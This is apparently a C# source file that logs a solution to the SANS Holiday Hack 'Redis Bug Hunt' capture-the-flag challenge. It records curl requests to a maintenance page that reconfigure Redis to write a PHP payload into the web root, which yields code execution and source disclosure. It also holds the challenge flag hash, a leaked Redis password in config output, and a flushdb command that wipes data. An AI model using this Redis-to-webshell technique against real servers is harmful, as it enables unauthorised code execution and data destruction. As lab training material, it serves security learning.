using Microsoft.Extensions.Logging;

namespace Janda.CTF.SANS.HolidayHack
{
    public class RedisBugHunt : IChallenge
    {
        private readonly ILogger<RedisBugHunt> _logger;

        public RedisBugHunt(ILogger<RedisBugHunt> logger)
        {
            _logger = logger;
        }



        /// <summary>
        /// Remote Code Execution (RCE)
        /// </summary>
        public void Run()
        {

            @"

                We need your help!!

                The server stopped working, all that's left is the maintenance port.

                To access it, run:

                curl http://localhost/maintenance.php

                We're pretty sure the bug is in the index page. Can you somehow use the
                maintenance page to view the source code for the index page?
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+readfile('index.php')+%3F%3E""
                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php readfile('\''index.php'\'') ?>'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=save
                Running: redis-cli --raw -a '<password censored>' 'save'

                OK
                player@58394353a03f:~$ curl http://localhost/some.php
                Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
                Warning: curl to output it to your terminal anyway, or consider ""--output 
                Warning: <FILE>"" to save to a file.
                player@58394353a03f:~$ curl http://localhost/some.php --output -
                REDIS0009�      redis-ver5.0.3�
                �edis-bits�@�ctime�ª�_used-mem
                 aof-preamble��� test<?php

                # We found the bug!!
                #
                #         \   /
                #         .\-/.
                #     /\ ()   ()
                #       \/~---~\.-~^-.
                # .-~^-./   |   \---.
                #      {    |    }   \
                #    .-~\   |   /~-.
                #   /    \  A  /    \
                #         \/ \/
                # 

                echo ""Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on""
                ?>
                example1The site is in maintenance modexample2#We think there's a bug in index.php���'i hplayer@58394353a03f:~$ 

            ".LogMessage(_logger, "Run following commands: \n{1}\n{2}\n{3}\n{4}\n{5}\n",
                "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html",
                "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php",
                "curl http://localhost/maintenance.php?cmd=set,test,\"%3C%3Fphp+readfile('index.php')+%3F%3E\"",
                "curl http://localhost/maintenance.php?cmd=save",
                "curl http://localhost/some.php --output -");
        }

        void Investigation()
        {

            @"
                We need your help!!

                The server stopped working, all that's left is the maintenance port.

                To access it, run:

                curl http://localhost/maintenance.php

                We're pretty sure the bug is in the index page. Can you somehow use the
                maintenance page to view the source code for the index page?

            ".LogMessage(_logger, "player@bef087130d45:~$");


            @"
                Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on
            ".LogMessage(_logger, "curl http://localhost");


            @"
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'

                OK
            ".LogMessage(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html");


            @"
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'

                OK
            ".LogMessage(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php");



            @"
                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php show_source('\''index.php'\'') ?>'

                OK
            ".LogMessage(_logger, @"curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+show_source('index.php')+%3F%3E""");


            @"
                Running: redis-cli --raw -a '<password censored>' 'save'

                OK
            ".LogMessage(_logger, @"curl http://localhost/maintenance.php?cmd=save");




            //@"
            //    Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'index.php'

            //    OK
            //".LogMessage(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,index.php");

            //@"
            //    Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php phpinfo(); ?>'

            //    OK
            // ".LogMessage(_logger, "player@4389dbda2fc2:~$ curl http://localhost/maintenance.php?cmd=set,test,\"%3C%3Fphp+phpinfo()%3B+%3F%3E\"");




            @"
                Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
                Warning: curl to output it to your terminal anyway, or consider ""--output 
                Warning: <FILE>"" to save to a file.
            ".LogMessage(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php");




            @"
                REDIS0009�      redis-ver5.0.3�
                �edis-bits�@�ctime·��_used-mem
                 aof-preamble���example2#We think there's a bug in index.phptest!<code><span style=""color: #000000"">
                <span style=""color: #0000BB"">&lt;?php<br /><br /></span><span style=""color: #FF8000"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{""hash"":&nbsp;""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b"",&nbsp;""resourceId"":&nbsp;""7246f9a7-3cf1-4471-b663-f4e8391b0208""}#####<br /><br /></span><span style=""color: #007700"">echo&nbsp;</span><span style=""color: #DD0000"">""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on""<br /></span><span style=""color: #0000BB"">?&gt;<br /></span>
                </span>
                </codeexample1The site is in maintenance mode�߹�(�56]

            ".LogMessage(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php --output -");



            // unlink()
            //


            // "%3C%3Fphp+show_source('filename.php')%3B+%3F%3E%0A";

            //player@13f6551f33d9:~$ curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+%24g=glob('*'
            //);foreach(%24g+as+%24f)+echo+%24f;+show_source('index.php');+%3F%3E"
            //Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php $g=glob('\''*'\'');foreach($g as $f) echo $f; show_source('\''index.php'\''); ?>'

            //OK
            //player@13f6551f33d9:~$ curl http://localhost/maintenance.php?cmd=save
            //Running: redis-cli --raw -a '<password censored>' 'save'

            //OK
            //player@13f6551f33d9:~$ curl http://localhost --output -
            //REDIS0009�      redis-ver5.0.3�
            //�edis-bits�@�ctime�F��_used-mem¨
            // aof-preamble��� test@Jdump.rdbindex.phpmaintenance.php<code><span style="color: #000000">
            //�EDIS0009�&nbsp;&nbsp;&nbsp;&nbsp;redis-ver5.0.3�<br />redis-bits�@�ctime�F��_used-mem¨
            // aof-preamble��� test@J<span style="color: #0000BB">&lt;?php&nbsp;$g</span><span style="color: #007700">=</span><span style="color: #0000BB">glob</span><span style="color: #007700">(</span><span style="color: #DD0000">'*'</span><span style="color: #007700">);foreach(</span><span style="color: #0000BB">$g&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$f</span><span style="color: #007700">)&nbsp;echo&nbsp;</span><span style="color: #0000BB">$f</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">show_source</span><span style="color: #007700">(</span><span style="color: #DD0000">'index.php'</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">?&gt;</spanexample2#We&nbsp;think&nbsp;there's&nbsp;a&nbsp;bug&nbsp;in&nbsp;index.phexample1The&nbsp;site&nbsp;is&nbsp;in&nbsp;maintenance&nbsp;mode�$Xآ��?!</span>
            //</codeexample2#We think there's a bug in index.phexample1The site is in maintenance mode�$Xآ��?!player@13f6551f33d9:~$ 
            //        


            @"

                <?php

                # We found the bug!!
                #
                #         \   /
                #         .\-/.
                #     /\ ()   ()
                #       \/~---~\.-~^-.
                # .-~^-./   |   \---.
                #      {    |    }   \
                #    .-~\   |   /~-.
                #   /    \  A  /    \
                #         \/ \/
                # #####hhc:{""hash"": ""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b"", ""resourceId"": ""7246f9a7-3cf1-4471-b663-f4e8391b0208""}#####

                echo ""Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on""
                ?>

            ".LogMessage(_logger, "index.php {html}", @"<code><span style=\""color: #000000\""><span style=\""color: #0000BB\"">&lt;?php<br /><br /></span><span style=\""color: #FF8000\"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\""hash\"":&nbsp;\""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\"",&nbsp;\""resourceId\"":&nbsp;\""7246f9a7-3cf1-4471-b663-f4e8391b0208\""}#####<br /><br /></span><span style=\""color: #007700\"">echo&nbsp;</span><span style=\""color: #DD0000\"">\""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\""<br /></span><span style=\""color: #0000BB\"">?&gt;<br /></span></span></code>\");
        }


        void BadRequest()
        {
            @"                
                <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
                <html><head>
                <title>400 Bad Request</title>
                </head><body>
                <h1>Bad Request</h1>
                <p>Your browser sent a request that this server could not understand.<br />
                </p>
                <hr>
                <address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
                </body></html>
            ".LogMessage(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=\"select 1\"");
        }


        void Config()
        {
            @"
                Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*'

                dbfilename
                dump.rdb
                requirepass
                R3disp@ss
                masterauth

                cluster-announce-ip

                unixsocket

                logfile

                pidfile
                /var/run/redis_6379.pid
                slave-announce-ip

                replica-announce-ip

                maxmemory
                0
                proto-max-bulk-len
                536870912
                client-query-buffer-limit
                1073741824
                maxmemory-samples
                5
                lfu-log-factor
                10
                lfu-decay-time
                1
                timeout
                0
                active-defrag-threshold-lower
                10
                active-defrag-threshold-upper
                100
                active-defrag-ignore-bytes
                104857600
                active-defrag-cycle-min
                5
                active-defrag-cycle-max
                75
                active-defrag-max-scan-fields
                1000
                auto-aof-rewrite-percentage
                100
                auto-aof-rewrite-min-size
                67108864
                hash-max-ziplist-entries
                512
                hash-max-ziplist-value
                64
                stream-node-max-bytes
                4096
                stream-node-max-entries
                100
                list-max-ziplist-size
                -2
                list-compress-depth
                0
                set-max-intset-entries
                512
                zset-max-ziplist-entries
                128
                zset-max-ziplist-value
                64
                hll-sparse-max-bytes
                3000
                lua-time-limit
                5000
                slowlog-log-slower-than
                10000
                latency-monitor-threshold
                0
                slowlog-max-len
                128
                port
                6379
                cluster-announce-port
                0
                cluster-announce-bus-port
                0
                tcp-backlog
                511
                databases
                16
                repl-ping-slave-period
                10
                repl-ping-replica-period
                10
                repl-timeout
                60
                repl-backlog-size
                1048576
                repl-backlog-ttl
                3600
                maxclients
                10000
                watchdog-period
                0
                slave-priority
                100
                replica-priority
                100
                slave-announce-port
                0
                replica-announce-port
                0
                min-slaves-to-write
                0
                min-replicas-to-write
                0
                min-slaves-max-lag
                10
                min-replicas-max-lag
                10
                hz
                10
                cluster-node-timeout
                15000
                cluster-migration-barrier
                1
                cluster-slave-validity-factor
                10
                cluster-replica-validity-factor
                10
                repl-diskless-sync-delay
                5
                tcp-keepalive
                300
                cluster-require-full-coverage
                yes
                cluster-slave-no-failover
                no
                cluster-replica-no-failover
                no
                no-appendfsync-on-rewrite
                no
                slave-serve-stale-data
                yes
                replica-serve-stale-data
                yes
                slave-read-only
                yes
                replica-read-only
                yes
                slave-ignore-maxmemory
                yes
                replica-ignore-maxmemory
                yes
                stop-writes-on-bgsave-error
                yes
                daemonize
                no
                rdbcompression
                yes
                rdbchecksum
                yes
                activerehashing
                yes
                activedefrag
                no
                protected-mode
                no
                repl-disable-tcp-nodelay
                no
                repl-diskless-sync
                no
                aof-rewrite-incremental-fsync
                yes
                rdb-save-incremental-fsync
                yes
                aof-load-truncated
                yes
                aof-use-rdb-preamble
                yes
                lazyfree-lazy-eviction
                no
                lazyfree-lazy-expire
                no
                lazyfree-lazy-server-del
                no
                slave-lazy-flush
                no
                replica-lazy-flush
                no
                dynamic-hz
                yes
                maxmemory-policy
                noeviction
                loglevel
                notice
                supervised
                no
                appendfsync
                everysec
                syslog-facility
                local0
                appendonly
                no
                dir
                /
                save
                900 1 300 10 60 10000
                client-output-buffer-limit
                normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60
                unixsocketperm
                0
                slaveof

                notify-keyspace-events

                bind
                127.0.0.1

                
                ".LogMessage(_logger, "player@5ad9ff7da6fd:~$ curl {command}", "http://localhost/maintenance.php?cmd=config,get,*");

        }


        void Info()
        {
            @"
                Running: redis-cli --raw -a '<password censored>' 'info'

                # Server
                redis_version:5.0.3
                redis_git_sha1:00000000
                redis_git_dirty:0
                redis_build_id:1b271fe49834c463
                redis_mode:standalone
                os:Linux 4.19.0-13-cloud-amd64 x86_64
                arch_bits:64
                multiplexing_api:epoll
                atomicvar_api:atomic-builtin
                gcc_version:8.3.0
                process_id:6
                run_id:07b2eee118dbbf6bcf435da63808cd79eb5883ef
                tcp_port:6379
                uptime_in_seconds:1428
                uptime_in_days:0
                hz:10
                configured_hz:10
                lru_clock:14919737
                executable:/usr/bin/redis-server
                config_file:/usr/local/etc/redis/redis.conf

                # Clients
                connected_clients:1
                client_recent_max_input_buffer:0
                client_recent_max_output_buffer:0
                blocked_clients:0

                # Memory
                used_memory:858912
                used_memory_human:838.78K
                used_memory_rss:15118336
                used_memory_rss_human:14.42M
                used_memory_peak:858912
                used_memory_peak_human:838.78K
                used_memory_peak_perc:107.90%
                used_memory_overhead:845542
                used_memory_startup:795736
                used_memory_dataset:13370
                used_memory_dataset_perc:21.16%
                allocator_allocated:1145848
                allocator_active:1388544
                allocator_resident:6033408
                total_system_memory:135198154752
                total_system_memory_human:125.91G
                used_memory_lua:41984
                used_memory_lua_human:41.00K
                used_memory_scripts:0
                used_memory_scripts_human:0B
                number_of_cached_scripts:0
                maxmemory:0
                maxmemory_human:0B
                maxmemory_policy:noeviction
                allocator_frag_ratio:1.21
                allocator_frag_bytes:242696
                allocator_rss_ratio:4.35
                allocator_rss_bytes:4644864
                rss_overhead_ratio:2.51
                rss_overhead_bytes:9084928
                mem_fragmentation_ratio:18.99
                mem_fragmentation_bytes:14322320
                mem_not_counted_for_evict:0
                mem_replication_backlog:0
                mem_clients_slaves:0
                mem_clients_normal:49694
                mem_aof_buffer:0
                mem_allocator:jemalloc-5.1.0
                active_defrag_running:0
                lazyfree_pending_objects:0

                # Persistence
                loading:0
                rdb_changes_since_last_save:0
                rdb_bgsave_in_progress:0
                rdb_last_save_time:1608754730
                rdb_last_bgsave_status:ok
                rdb_last_bgsave_time_sec:0
                rdb_current_bgsave_time_sec:-1
                rdb_last_cow_size:6504448
                aof_enabled:0
                aof_rewrite_in_progress:0
                aof_rewrite_scheduled:0
                aof_last_rewrite_time_sec:-1
                aof_current_rewrite_time_sec:-1
                aof_last_bgrewrite_status:ok
                aof_last_write_status:ok
                aof_last_cow_size:0

                # Stats
                total_connections_received:15
                total_commands_processed:26
                instantaneous_ops_per_sec:0
                total_net_input_bytes:862
                total_net_output_bytes:8065
                instantaneous_input_kbps:0.00
                instantaneous_output_kbps:0.00
                rejected_connections:0
                sync_full:0
                sync_partial_ok:0
                sync_partial_err:0
                expired_keys:0
                expired_stale_perc:0.00
                expired_time_cap_reached_count:0
                evicted_keys:0
                keyspace_hits:0
                keyspace_misses:4
                pubsub_channels:0
                pubsub_patterns:0
                latest_fork_usec:823
                migrate_cached_sockets:0
                slave_expires_tracked_keys:0
                active_defrag_hits:0
                active_defrag_misses:0
                active_defrag_key_hits:0
                active_defrag_key_misses:0

                # Replication
                role:master
                connected_slaves:0
                master_replid:9673319a0669b034f58e4c89e53e5267d971f5cc
                master_replid2:0000000000000000000000000000000000000000
                master_repl_offset:0
                second_repl_offset:-1
                repl_backlog_active:0
                repl_backlog_size:1048576
                repl_backlog_first_byte_offset:0
                repl_backlog_histlen:0

                # CPU
                used_cpu_sys:0.991500
                used_cpu_user:0.950537
                used_cpu_sys_children:0.000000
                used_cpu_user_children:0.002377

                # Cluster
                cluster_enabled:0

                # Keyspace
                db0:keys=2,expires=0,avg_ttl=0
            ".LogMessage(_logger, "curl {command}", "http://localhost/maintenance.php?cmd=info");

        }

        void FlushDb()
        {
            @"                
                Running: redis-cli --raw -a '<password censored>' 'flushdb'

                OK
                player@255adc1ca1b3:~$ 
            ".LogMessage(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=flushdb");

        }
    }
}
